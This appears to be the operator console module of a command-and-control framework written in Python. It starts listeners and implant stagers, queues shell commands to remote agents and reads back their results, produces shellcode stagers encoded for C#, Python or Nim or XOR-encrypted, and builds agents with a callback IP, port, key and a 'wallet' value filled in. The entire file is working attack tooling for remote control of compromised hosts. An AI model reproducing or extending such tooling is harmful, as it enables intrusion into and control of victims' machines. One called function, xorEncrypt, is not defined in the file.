import requests
import os
import subprocess
import shellcode_generator
from collections import OrderedDict
from listener import Listener
from task import TaskShell
from database import Database
from stager_listener import StagerListener

listenersList = OrderedDict()
stagerListenerList = OrderedDict()
db = Database()
agentsList = db.getAgents()

def updateAgentsList():
    agentsList = db.getAgents()

def listAgents():
    for i in agentsList:
        print(f"\t-- {i} - <{agentsList[i].getName()}>")

def startListener(args):
    listener = Listener(args[0], int(args[2]), args[1])
    listener.start()
    listenersList[args[0]] = listener

    return 0

def startStagerListener(args):
    if len(args) == 3:
        listener = StagerListener(args[0], args[1], args[2])
    else:
        listener = StagerListener(args[0], args[1], "data/implant/agent.exe")
    os.environ["LPORT"] = args[1]
    os.environ["LHOST"] = args[0]

    stagerListenerList[args[0]] = listener

    listener.start()

    return 0

def stopStagerListener(ip):
    stagerListenerList[ip].stop()

def sendTask(command, args):
    agent = agentsList[args[0]]
    commandContent = ""
    if command == "shell":
        for i in range(1, len(args)):
            if i == 1:
                commandContent = args[i]
            else:
                commandContent = commandContent + " " + args[i]
        task = TaskShell(agent.getPath(), commandContent)
        agentsList[args[0]].setTask(task)
        listenersList[agent.getListener()].setAgentsList(agentsList)

    return 0

def retrieveTaskResult(args):
    agent = agentsList[args[0]]
    listener = listenersList[agent.getListener()]
    listenerIp = listener.getIp()
    listenerPort = listener.getPort()
    request = "http://{}:{}/showResult?agent={}".format(
        listenerIp,
        listenerPort,
        agent.getName()
    )

    res = requests.get(request)

    if res.status_code == 200:
        print(f"\tAgent return : {res.text}")

def listListeners():
    for i in listenersList:
        print(f"\t-- {i} - {listenersList[i].getName()}: <{listenersList[i].getIp()}:{listenersList[i].getPort()}>")

    return 0

def listStagerListener():
    for i in stagerListenerList:
        print(f"\t -- {i} - {stagerListenerList[i].getIp()}:{stagerListenerList[i].getPort()}")

    return 0

def generateShellcodeStager(args):
    exe, integration, pyIntregation = shellcode_generator.generateShellcode(args[0])

    if args[1].lower() == "c#":
        output = shellcode_generator.cSharpEncode(integration)
    elif args[1].lower() == "python":
        output = shellcode_generator.pythonEncode(pyIntregation)
    elif args[1].lower() == "nim":
        output = shellcode_generator.nimEncode(integration)
    elif args[1].lower() == "xor":
        if len(args) < 3:
            print("\t [Stager Error] Xor key missing !\n")
            return 1
        else:
            output = xorEncrypt(exe, args[2])
    else:
        print("\t[Stager Error] Format not supported !\n")
        return 1
    
    print("Shellcode : \n{}\n".format(output))

    return 0

def generateAgent(args):
    agentName = args[0]
    ip = args[1]
    port = args[2]
    wallet = args[3]
    key = args[4]
    savePath = args[5]

    with open("../../agent/agent.py", "r") as f:
        agent = f.read()
    
    agent = agent.replace("CUSTOM_IP", ip)
    agent = agent.replace("CUSTOM_PORT", port)
    agent = agent.replace("CUSTOM_NAME", agentName)
    agent = agent.replace("CUSTOM_WALLET", wallet)
    agent = agent.replace("CUSTOM_KEY", key)

    try:
        with open(savePath, "w") as f:
            f.write(agent)
            print(f"\tAgent saved at {savePath}.\n")
    except FileNotFoundError:
        print("\t[Error] Agent not saved, path not found !\n")
